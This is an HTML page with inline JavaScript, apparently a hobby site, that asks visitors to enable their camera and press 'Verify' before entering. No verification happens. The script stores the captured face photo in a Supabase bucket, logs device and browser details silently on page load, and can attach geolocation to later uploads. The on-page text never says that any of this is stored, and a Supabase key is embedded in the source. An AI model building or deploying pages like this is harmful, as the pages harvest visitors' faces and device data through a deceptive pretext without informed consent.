<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>A Little Place</title>
<style>
:root{--bg:#09090b;--text:#f5f5f5;--muted:#a1a1aa;--line:#27272a}
*{box-sizing:border-box}
html,body{margin:0;min-height:100%;background:var(--bg);color:var(--text);font-family:Inter,ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif}
body{overflow-x:hidden}
.stage{min-height:100vh;display:grid;place-items:center;padding:24px;position:relative}
.wrap{width:min(720px,100%);position:relative;z-index:2}
.card{border:1px solid var(--line);border-radius:28px;padding:32px;background:rgba(12,12,15,.72);backdrop-filter:blur(18px);box-shadow:0 30px 100px rgba(0,0,0,.45)}
h1{font-size:clamp(38px,10vw,72px);letter-spacing:-.055em;line-height:.95;margin:0 0 16px}
h2{font-size:24px;margin:0 0 10px}
p{color:var(--muted);line-height:1.65}
.hidden{display:none!important}
button,.file-label{appearance:none;border:1px solid #3f3f46;background:#18181b;color:#fff;padding:14px 18px;border-radius:14px;font:inherit;font-weight:700;cursor:pointer}
button.primary,.file-label.primary{background:#fff;color:#09090b;border-color:#fff}
button:disabled{opacity:.45;cursor:not-allowed}
.actions{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:24px}
input[type=file]{display:none}
.video-wrap{margin-top:22px;position:relative;overflow:hidden;border-radius:20px;border:1px solid var(--line);background:#000}
video{display:block;width:100%;aspect-ratio:4/3;object-fit:cover}
.preview{margin-top:18px}
.preview img,.preview video{max-height:430px;object-fit:contain;border-radius:18px;background:#000}
.status{min-height:24px;margin-top:14px;font-size:14px;color:#ddd}
.consent{display:flex;gap:10px;margin-top:20px;color:#aaa;font-size:13px;line-height:1.5}
.consent input{margin-top:4px}
.notice{font-size:12px;color:#777;margin-top:24px}
.fade{animation:fade .9s ease both}
@keyframes fade{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
@media(max-width:560px){.card{padding:24px}.actions{grid-template-columns:1fr}}
</style>
</head>
<body>

<main class="stage">
<div class="wrap">

<section id="gate" class="card fade">
  <h1>Before you enter.</h1>
  <p>
    This page is made out of boredom at 3 am by Adi, LOL! Idk what the hell I am doing at this time of the night
  </p>

  <div class="consent">
    <input id="cameraConsent" type="checkbox">
    <label for="cameraConsent">I understand.</label>
  </div>

  <button id="startCamera" class="primary" type="button" style="margin-top:20px;width:100%">
    Enable camera
  </button>

  <div id="cameraArea" class="hidden">
    <div class="video-wrap">
      <video id="camera" autoplay playsinline muted></video>
    </div>
    <button id="verify" class="primary" type="button" style="width:100%;margin-top:14px">
      Verify
    </button>
  </div>

  <div id="gateStatus" class="status" aria-live="polite"></div>
</section>

<section id="hub" class="card hidden fade">
  <h2>Sasta Snapchat?.</h2>
  <p>If you want to leave a random photo or video, choose one below.</p>

  <div class="actions">
    <label class="file-label" for="gallery">Select from Gallery</label>
    <label class="file-label" for="cameraFile">Use Camera</label>
    <input id="gallery" type="file" accept="image/*,video/*">
    <input id="cameraFile" type="file" accept="image/*,video/*" capture="environment">
  </div>

  <div id="preview" class="preview hidden">
    <div id="previewBox"></div>
    <button id="upload" class="primary" type="button" style="width:100%;margin-top:14px">
      Send it
    </button>
  </div>

  <div class="consent">
    <input id="locationConsent" type="checkbox">
    <label for="locationConsent">Location.</label>
  </div>

  <div id="hubStatus" class="status" aria-live="polite"></div>

  <p class="notice">
    testing if this site can have upload and capture options.
  </p>
</section>

</div>
</main>

<audio id="music" src="loser.mp3" loop preload="auto"></audio>

<script>
const SUPABASE_URL = "https://jgigibyqfatyvrlhhprm.supabase.co";
const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImpnaWdpYnlxZmF0eXZybGhocHJtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODYzNzc0NTYsImV4cCI6MjEwMTk1MzQ1Nn0.EmDUloa2s4yNHfSIi1td0rqs2pih238JIlCdF41jQ3g";

const LOG_TABLE = "logs";
const BUCKET = "visitor-photos";

const authHeaders = () => ({
  "apikey": SUPABASE_KEY,
  "Authorization": "Bearer " + SUPABASE_KEY
});

function deviceInfo(){
  const ua = navigator.userAgent || "";
  let device =
    /iPhone/i.test(ua) ? "iPhone" :
    /iPad/i.test(ua) ? "iPad" :
    /Android/i.test(ua) ? "Android" :
    /Windows/i.test(ua) ? "Windows PC" :
    /Macintosh|Mac OS X/i.test(ua) ? "Mac" :
    /Linux/i.test(ua) ? "Linux PC" : "Other";

  let browser =
    /Edg/i.test(ua) ? "Edge" :
    /Chrome/i.test(ua) ? "Chrome" :
    /Safari/i.test(ua) && !/Chrome/i.test(ua) ? "Safari" :
    /Firefox/i.test(ua) ? "Firefox" : "Other";

  return {
    device,
    browser,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
    language: navigator.language || "",
    screen: `${screen.width}x${screen.height}`,
    referrer: document.referrer || ""
  };
}

async function logEvent(event, extra = {}){
  try{
    await fetch(`${SUPABASE_URL}/rest/v1/${LOG_TABLE}`, {
      method:"POST",
      headers:{
        ...authHeaders(),
        "Content-Type":"application/json",
        "Prefer":"return=minimal"
      },
      body:JSON.stringify({
        event,
        ...deviceInfo(),
        ...extra
      })
    });
  }catch(e){
    console.debug("Log unavailable",e);
  }
}

logEvent("page_open");

const gate = document.getElementById("gate");
const hub = document.getElementById("hub");
const camera = document.getElementById("camera");
const cameraArea = document.getElementById("cameraArea");
const gateStatus = document.getElementById("gateStatus");
const music = document.getElementById("music");

let stream = null;
let selectedFile = null;

document.getElementById("startCamera").addEventListener("click", async () => {
  if(!document.getElementById("cameraConsent").checked){
    gateStatus.textContent = "Please confirm camera consent first.";
    return;
  }

  try{
    stream = await navigator.mediaDevices.getUserMedia({
      video:{facingMode:"user"},
      audio:false
    });
    camera.srcObject = stream;
    cameraArea.classList.remove("hidden");
    gateStatus.textContent = "Camera enabled. Press Verify when you're ready.";
  }catch(e){
    gateStatus.textContent = "Camera access was not granted.";
  }
});

document.getElementById("verify").addEventListener("click", async () => {
  if(!stream){
    gateStatus.textContent = "Enable the camera first.";
    return;
  }

  const canvas = document.createElement("canvas");
  canvas.width = camera.videoWidth || 1280;
  canvas.height = camera.videoHeight || 960;
  canvas.getContext("2d").drawImage(camera,0,0,canvas.width,canvas.height);

  gateStatus.textContent = "Uploading verification photo…";

  canvas.toBlob(async blob => {
    try{
      const path = `verification/${Date.now()}-${crypto.randomUUID()}.jpg`;

      const upload = await fetch(
        `${SUPABASE_URL}/storage/v1/object/${BUCKET}/${path}`,
        {
          method:"POST",
          headers:{
            ...authHeaders(),
            "Content-Type":"image/jpeg",
            "x-upsert":"false"
          },
          body:blob
        }
      );

      if(!upload.ok) throw new Error(await upload.text());

      await logEvent("face_verification", {
        file_path:path
      });

      stream.getTracks().forEach(t => t.stop());
      camera.srcObject = null;

      music.volume = 0.35;
      music.play().catch(()=>{});

      gate.classList.add("hidden");
      hub.classList.remove("hidden");
    }catch(e){
      console.error(e);
      gateStatus.textContent = "Verification upload failed. Check the Supabase Storage policy.";
    }
  },"image/jpeg",0.88);
});

const preview = document.getElementById("preview");
const previewBox = document.getElementById("previewBox");

document.querySelectorAll('input[type="file"]').forEach(input => {
  input.addEventListener("change", e => {
    const file = e.target.files && e.target.files[0];
    if(!file) return;

    selectedFile = file;
    preview.classList.remove("hidden");
    previewBox.innerHTML = "";

    const objectURL = URL.createObjectURL(file);

    if(file.type.startsWith("video/")){
      const v = document.createElement("video");
      v.src = objectURL;
      v.controls = true;
      v.playsInline = true;
      previewBox.appendChild(v);
    }else{
      const img = document.createElement("img");
      img.src = objectURL;
      img.alt = "Selected photo";
      previewBox.appendChild(img);
    }
  });
});

function getLocation(){
  return new Promise(resolve => {
    if(!document.getElementById("locationConsent").checked ||
        !navigator.geolocation){
      resolve({});
      return;
    }

    navigator.geolocation.getCurrentPosition(
      p => resolve({
        latitude:p.coords.latitude,
        longitude:p.coords.longitude,
        accuracy:Math.round(p.coords.accuracy)
      }),
      () => resolve({}),
      {enableHighAccuracy:false,timeout:7000,maximumAge:300000}
    );
  });
}

document.getElementById("upload").addEventListener("click", async () => {
  const status = document.getElementById("hubStatus");

  if(!selectedFile){
    status.textContent = "Choose a photo or video first.";
    return;
  }

  status.textContent = "Uploading…";

  try{
    const location = await getLocation();
    const safeName = selectedFile.name.replace(/[^a-zA-Z0-9._-]/g,"_");
    const path = `uploads/${Date.now()}-${crypto.randomUUID()}-${safeName}`;

    const upload = await fetch(
      `${SUPABASE_URL}/storage/v1/object/${BUCKET}/${path}`,
      {
        method:"POST",
        headers:{
          ...authHeaders(),
          "Content-Type":selectedFile.type || "application/octet-stream",
          "x-upsert":"false"
        },
        body:selectedFile
      }
    );

    if(!upload.ok) throw new Error(await upload.text());

    await logEvent("media_upload", {
      file_path:path,
      media_type:selectedFile.type,
      ...location
    });

    status.textContent = "Sent.";
    preview.classList.add("hidden");
    selectedFile = null;
  }catch(e){
    console.error(e);
    status.textContent = "Upload failed. Check your Supabase policies and bucket.";
  }
});
</script>
</body>
</html>
